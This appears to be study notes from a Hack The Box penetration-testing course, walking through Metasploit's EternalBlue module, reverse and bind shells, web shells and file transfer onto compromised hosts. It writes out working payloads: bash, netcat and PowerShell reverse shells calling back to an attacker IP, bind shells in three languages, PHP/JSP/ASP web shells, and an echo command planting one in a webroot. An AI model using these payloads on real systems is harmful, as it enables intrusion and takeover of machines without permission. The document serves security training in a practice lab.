### **Metasploit Primer**

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

- Running reconnaissance scripts to enumerate remote hosts and compromised targets
- Verification scripts to test the existence of a vulnerability without actually compromising the target
- Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
- Many post-exploitation and pivoting tools

Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run `Metasploit`, we can use the `msfconsole` command:

```
th1nyunb0y@htb[/htb]$ msfconsole      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.

                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]

+ -- --=[ 7 evasion                                       ]

```

Once we have `Metasploit` running, we can search for our target application with the `search exploit` command. For example, we can search for the SMB vulnerability we identified previously:

```
msf6 > search exploit eternalblue

Matching Modules
================

```

Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search

We found one exploit for this service. We can use it by copying the full name of it and using `USE` to use it:

```
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

```

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the `show options` command:

```

...SNIP...

```

Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have two options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). The second option, `LHOST`, represents the IP of our attack host (this can be a single IP, or the name of a network interface. In the example below, `LHOST` is being set to the IP associated with our `tun0` interface.) We can set them with the `set` command:

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0

```

Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

```
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.

```

As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:

```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:

- Granny/Grandpa
- Jerry
- Blue
- Lame
- Optimum
- Legacy
- Devel

## **Types of Shells**

Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., `Bash` or `PowerShell`, so we can thoroughly investigate the remote system for our next move.

One way to connect to a compromised system is through network protocols, like `SSH` for Linux or `WinRM` for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.

The other method of accessing a compromised host for control and remote code execution is through shells.

As previously discussed, there are three main types of shells: Reverse Shell, Bind Shell, and Web Shell. Each of these shells has a different method of communication with us for accepting and executing our commands.

| **Type of Shell** | **Method of Communication** |
| --- | --- |
| `Reverse Shell` | Connects back to our system and gives us control through a reverse connection. |
| `Bind Shell` | Waits for us to connect to it and gives us control once we do. |
| `Web Shell` | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |

Let us dive more deeply into each of the above shells and walk through examples of each.

---

### **Reverse Shell**

A `Reverse Shell` is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a `netcat` listener on our machine that listens on a specific port, say port `1234`. With this listener in place, we can execute a `reverse shell command` that connects the remote systems shell, i.e., `Bash` or `PowerShell` to our `netcat` listener, which gives us a reverse connection over the remote system.

**Netcat Listener**

The first step is to start a `netcat` listener on a port of our choosing:

```
th1nyunb0y@htb[/htb]$ nc -lvnp 1234listening on [any] 1234 ...

```

The flags we are using are the following:

| **Flag** | **Description** |
| --- | --- |
| `-l` | Listen mode, to wait for a connection to connect to us. |
| `-v` | Verbose mode, so that we know when we receive a connection. |
| `-n` | Disable DNS resolution and only connect from/to IPs, to speed up the connection. |
| `-p 1234` | Port number `netcat` is listening on, and the reverse connection should be sent to. |

Now that we have a `netcat` listener waiting for a connection, we can execute the reverse shell command that connects to us.

**Connect Back IP**

However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the following command:

```
th1nyunb0y@htb[/htb]$ ip a...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...

```

In our example, the IP we are interested in is under `tun0`, which is the same HTB network we connected to through our VPN.

Note: We are connecting to the IP in 'tun0' because we can only connect to HackTheBox boxes through the VPN connection, as they do not have internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.

**Reverse Shell Command**

The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access. The [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.

Certain reverse shell commands are more reliable than others and can usually be attempted to get a reverse connection. The below commands are reliable commands we can use to get a reverse connection, for `bash` on Linux compromised hosts and `Powershell` on Windows compromised hosts:

Bash:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i2>&1|nc 10.10.10.10 1234 >/tmp/f

```

Powershell:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"

```

We can utilize the exploit we have over the remote host to execute one of the above commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our `netcat` listener:

```
th1nyunb0y@htb[/htb]$ nc -lvnp 1234listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

As we can see, after we received a connection on our `netcat` listener, we were able to type our command and directly get its output back, right in our machine.

A `Reverse Shell` is handy when we want to get a quick, reliable connection to our compromised host. However, a `Reverse Shell` can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.

### **Bind Shell**

Another type of shell is a `Bind Shell`. Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.

Once we execute a `Bind Shell Command`, it will start listening on a port on the remote host and bind that host's shell, i.e., `Bash` or `PowerShell`, to that port. We have to connect to that port with `netcat`, and we will get control through a shell on that system.

**Bind Shell Command**

Once again, we can utilize [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) to find a proper command to start our bind shell.

Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.

The following are reliable commands we can use to start a bind shell:

Bash:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i2>&1|nc -lvp 1234 >/tmp/f

```

Python:

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

```

Powershell:

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

```

**Netcat Connection**

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.

We can use `netcat` to connect to that port and get a connection to the shell:

Types of Shells

```
th1nyunb0y@htb[/htb]$ nc 10.10.10.1 1234id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

**Upgrading TTY**

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:

```
th1nyunb0y@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

```
www-data@remotehost$ ^Zth1nyunb0y@htb[/htb]$ stty raw -echoth1nyunb0y@htb[/htb]$ fg[Enter]
[Enter]
www-data@remotehost$

```

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

```
th1nyunb0y@htb[/htb]$ echo $TERMxterm-256color

```

```
th1nyunb0y@htb[/htb]$ stty size67 318

```

The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:

```
www-data@remotehost$ export TERM=xterm-256colorwww-data@remotehost$ stty rows 67 columns 318
```

Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.

### **Web Shell**

The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

**Writing a Web Shell**

First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

Php:

```php
<?php system($_REQUEST["cmd"]);?>
```

Jsp:

```java
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

```

Asp:

```
<% eval request("cmd") %>

```

**Uploading a Web Shell**

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

| **Web Server** | **Default Webroot** |
| --- | --- |
| `Apache` | /var/www/html/ |
| `Nginx` | /usr/local/nginx/html/ |
| `IIS` | c:\inetpub\wwwroot\ |
| `XAMPP` | C:\xampp\htdocs\ |

We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

Code: bash

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

```

**Accessing Web Shell**

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

![https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Another option is to use `cURL`:

Types of Shells

```
th1nyunb0y@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=iduid=33(www-data) gid=33(www-data) groups=33(www-data)

```

As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on `80` or `443`, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a `Python` script to automate this process and give us a semi-interactive web shell right within our terminal.

## **Transferring Files**

### **Using wget**

There are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

```
th1nyunb0y@htb[/htb]$ cd /tmpth1nyunb0y@htb[/htb]$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]

```

Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:

```
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k

```

Note that we used the `-o` flag to specify the output file name.

### **Using SCP**

Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

Transferring Files

```
th1nyunb0y@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.shuser@remotehost's password: *********
linenum.sh

```

Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.

### **Using Base64**

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:

```
th1nyunb0y@htb[/htb]$ base64 shell -w 0f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU

```

Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:

```
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

```

### **Validating File Transfers**

To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:

```
user@remotehost$ file shellshell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

```

As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:

```
th1nyunb0y@htb[/htb]$ md5sum shell321de1d7e7c3735838890a72c9ae7d1d shell

```

Now, we can go to the remote server and run the same command on the file we transferred:

```
user@remotehost$ md5sum shell321de1d7e7c3735838890a72c9ae7d1d shell

```

As we can see, both files have the same md5 hash, meaning the file was transferred correctly. There are various other methods for transferring files. You can check out the [File Transfers](https://academy.hackthebox.com/module/details/24) module for a more detailed study on transferring files.
